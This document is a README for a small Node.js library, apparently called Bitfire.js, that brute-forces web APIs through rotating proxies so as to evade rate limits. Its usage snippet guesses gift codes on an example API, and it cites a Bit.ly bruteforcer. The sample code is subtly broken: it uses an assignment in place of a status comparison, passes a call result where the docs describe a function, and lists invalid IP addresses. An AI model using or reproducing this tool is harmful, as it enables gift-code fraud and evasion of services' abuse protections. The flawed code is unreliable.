# Bitfire.js
Simple Proxy Bruteforcer for Node.js allowing you to perform any api attack (by specifying a function) using proxy lists to bypass any ratelimits using the requests module.

It is my first library, so I don't recommend actually using this in production.

Currently only GET requests can be bruteforced but this can be changed by modifying a line of code.

![alt text](https://i.imgur.com/5orefhi.png "yes")

*Bit.ly Bruteforcer Example*
# Usage
```js
var bitfire = require("bitfire");
function generateCode(){
var nf = "http://example.org/api/giftcodes/check/" + getRandomCode();
return nf;
}
var proxyArray = ["123.293.192:8000","942.323.234.122:8080"];
bitfire.proxyBrute(generateCode(),proxyArray,10,function(error,response,body,code){
if(response.statusCode = 200){
console.log("Found Giftcode: " + code);
process.exit(0);
}
})
```

**bitfire.proxyBrute(function to generate api url to check, array of proxys, interval between requests, callback)**
